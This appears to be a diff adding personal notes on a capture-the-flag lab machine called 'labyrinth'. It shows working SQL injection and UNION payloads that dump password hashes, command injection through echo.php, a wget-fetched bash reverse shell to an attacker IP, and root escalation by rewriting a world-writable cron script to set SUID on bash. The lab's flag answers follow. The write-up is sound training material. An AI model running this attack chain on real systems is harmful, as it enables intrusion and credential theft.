@@ -207,3 +207,212 @@ function pwdgen() {
     c = ["c", "k", "h", "p", "q", "9", "w", "v", "5", "p", "4"]
 }
 //pwd gen for Daedalus a[9]+b[10]+b[5]+c[8]+c[8]+c[1]+a[1]+a[5]+c[0]+c[1]+c[8]+b[8]
+//                             |\____/|
+///                           (\|----|/)
+//                             \ 0  0 /
+//                              |    |
+//                           ___/\../\____
+//                          /     --       \
+
+$(document).ready(function() {
+    $("#forgot-password").click(function() {
+        alert("Ye .... Thought it would be this easy? \n                       -_______-")
+    });
+    $("#submit").click(function() {
+        console.log("TEST")
+
+        var email = $("#email1").val();
+        var password = $("#password1").val();
+
+        if (email == '' || password == '') {
+            alert("Please fill all fields.");
+            return false;
+        }
+
+        $.ajax({
+            type: "POST",
+            url: "login.php",
+            data: {
+                email: email,
+                password: password
+
+            },
+            cache: false,
+            success: function(data) {
+                //alert(data);
+                window.location.href = "index.php"
+            },
+            error: function(xhr, status, error) {
+                console.error(xhr);
+            }
+        });
+
+    });
+
+});
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 mino.py    
+g2e55kh4ck5r
+
+Daedalus:g2e55kh4ck5r login
+
+search creatures
+' or 1=1#
+
+ID 	Name 	Password
+1	Cerberos	3898e56bf6fa6ddfc3c0977c514a65a8
+2	Pegasus	5d20441c392b68c61592b2159990abfe
+3	Chiron	f847149233ae29ec0e1fcf052930c044
+4	Centaurus	ea5540126c33fe653bf56e7a686b1770
+
+and people
+
+ID 	Name 	Password
+1	Eurycliedes	42354020b68c7ed28dcdeabd5a2baf8e
+2	Menekrates	0b3bebe266a81fbfaa79db1604c4e67f
+3	Philostratos	b83f966a6f5a9cff9c6e1c52b0aa635b
+4	Daedalus	b8e4c23686a3a12476ad7779e35f5eb6
+5	M!n0taur	1765db9457f496a39859209ee81fbda4  aminotauro
+
+or
+
+' UNION SELECT 1,2,group_concat(namePeople,":",passwordPeople,":",permissionPeople SEPARATOR '<br>') FROM people;--
+
+Eurycliedes:42354020b68c7ed28dcdeabd5a2baf8e:user
+Menekrates:0b3bebe266a81fbfaa79db1604c4e67f:user
+Philostratos:b83f966a6f5a9cff9c6e1c52b0aa635b:user
+Daedalus:b8e4c23686a3a12476ad7779e35f5eb6:user
+M!n0taur:1765db9457f496a39859209ee81fbda4:admin
+
+https://md5hashing.net/hash/md5/1765db9457f496a39859209ee81fbda4
+
+login
+
+<a class='nav-link' href=''>fla6{7H@Ts_tHe_Dat48as3_F149}</a>
+
+secret stuff
+
+this is the regex used: /[#!@%^&*()$_=\[\]\';,{}:>?~\\\\]/
+
+command injection
+
+http://10.10.93.209/echo.php
+
+http://10.10.93.209/echo.php?search=hi|id
+
+uid=1(daemon) gid=1(daemon) groups=1(daemon) 
+
+revshell
+┌──(witty㉿kali)-[~]
+└─$ cat revshell1 
+#!/bin/bash
+bash -c "bash -i >& /dev/tcp/10.8.19.103/4444 0>&1"
+
+┌──(witty㉿kali)-[~]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.180.250 - - [26/Jul/2023 23:07:05] "GET /revshell1 HTTP/1.1" 200 -
+
+http://10.10.180.250/echo.php?search=|wget%2010.8.19.103/revshell1%20-O%20/tmp/shell
+
+http://10.10.180.250/echo.php?search=|chmod%20777%20/tmp/shell
+
+http://10.10.180.250/echo.php?search=|/tmp/shell
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.180.250] 49268
+bash: cannot set terminal process group (809): Inappropriate ioctl for device
+bash: no job control in this shell
+bash: /root/.bashrc: Permission denied
+daemon@labyrinth:/opt/lampp/htdocs$ /usr/bin/script -qc /bin/bash /dev/null
+daemon@labyrinth:/home/user$ cat flag.txt
+cat flag.txt
+fla9{5upeR_secr37_uSEr_flaG}
+
+daemon@labyrinth:/home/user$ ls -lah /
+ls -lah /
+total 712M
+drwxr-xr-x  26 root root 4,0K nov    9  2021 .
+drwxr-xr-x  26 root root 4,0K nov    9  2021 ..
+drwxr-xr-x   2 root root 4,0K szept 20  2021 bin
+drwxr-xr-x   3 root root 4,0K nov    9  2021 boot
+drwxrwxr-x   2 root root 4,0K jún   15  2021 cdrom
+drwxr-xr-x  17 root root 4,1K júl   27 04:50 dev
+drwxr-xr-x 126 root root  12K nov   10  2021 etc
+drwxr-xr-x   5 root root 4,0K jún   18  2021 home
+lrwxrwxrwx   1 root root   32 nov    9  2021 initrd.img -> boot/initrd.img-5.4.0-90-generic
+lrwxrwxrwx   1 root root   32 nov    9  2021 initrd.img.old -> boot/initrd.img-5.4.0-89-generic
+drwxr-xr-x  21 root root 4,0K jún   15  2021 lib
+drwxr-xr-x   2 root root 4,0K szept 20  2021 lib64
+drwx------   2 root root  16K jún   15  2021 lost+found
+drwxr-xr-x   2 root root 4,0K aug    7  2020 media
+drwxr-xr-x   2 root root 4,0K aug    7  2020 mnt
+drwxr-xr-x   3 root root 4,0K jún   15  2021 opt
+dr-xr-xr-x 246 root root    0 júl   27 04:48 proc
+drwxr-xr-x   2 root root 4,0K jún   15  2021 reminders
+drwx------   7 root root 4,0K jún   15  2021 root
+drwxr-xr-x  29 root root  920 júl   27 05:06 run
+drwxr-xr-x   2 root root  12K szept 20  2021 sbin
+drwxr-xr-x  14 root root 4,0K szept 23  2021 snap
+drwxr-xr-x   2 root root 4,0K jún   16  2021 srv
+-rw-------   1 root root 712M jún   15  2021 swapfile
+dr-xr-xr-x  13 root root    0 júl   27 04:48 sys
+drwxrwxrwx   2 root root 4,0K jún   15  2021 timers
+drwxrwxrwt  13 root root 4,0K júl   27 05:28 tmp
+drwxr-xr-x  11 root root 4,0K aug    7  2020 usr
+drwxr-xr-x  16 root root 4,0K jún   15  2021 var
+lrwxrwxrwx   1 root root   29 nov    9  2021 vmlinuz -> boot/vmlinuz-5.4.0-90-generic
+lrwxrwxrwx   1 root root   29 nov    9  2021 vmlinuz.old -> boot/vmlinuz-5.4.0-89-generic
+daemon@labyrinth:/home/user$ cd /timers
+cd /timers
+daemon@labyrinth:/timers$ ls -lah
+ls -lah
+total 12K
+drwxrwxrwx  2 root root 4,0K jún   15  2021 .
+drwxr-xr-x 26 root root 4,0K nov    9  2021 ..
+-rwxrwxrwx  1 root root   70 jún   15  2021 timer.sh
+daemon@labyrinth:/timers$ lsattr timer.sh
+lsattr timer.sh
+--------------e--- timer.sh
+daemon@labyrinth:/timers$ cat timer.sh
+cat timer.sh
+#!/bin/bash
+echo "dont fo...forge...ttt" >> /reminders/dontforget.txt
+
+daemon@labyrinth:/timers$ echo "chmod u+s /bin/bash" > timer.sh
+echo "chmod u+s /bin/bash" > timer.sh
+daemon@labyrinth:/timers$ ls -lah /bin/bash
+ls -lah /bin/bash
+-rwxr-xr-x 1 root root 1,1M jún    7  2019 /bin/bash
+daemon@labyrinth:/timers$ ls -lah /bin/bash
+ls -lah /bin/bash
+-rwsr-xr-x 1 root root 1,1M jún    7  2019 /bin/bash
+
+daemon@labyrinth:/timers$ /bin/bash -p
+/bin/bash -p
+id
+uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)
+cd /root
+ls
+da_king_flek.txt
+snap
+xampp_setup_job
+cat da_king_flek.txt
+fL4G{YoU_R0OT3d_1T_coN9ra7$}
+```
+What is flag 1?
+*fl4g{tHa75_TH3_$7Ar7_ftPFLA9}*
+What is flag 2?
+*fla6{7H@Ts_tHe_Dat48as3_F149}*
+What is the user flag?
+this is the regex used: /[#!@%^&*()$_=\[\]\';,{}:>?~\\\\]/
+*fla9{5upeR_secr37_uSEr_flaG}*
+What is the root flag?
+*fL4G{YoU_R0OT3d_1T_coN9ra7$}*
+
+## Notes / Lessons Learned
+[[Ghizer]]
+
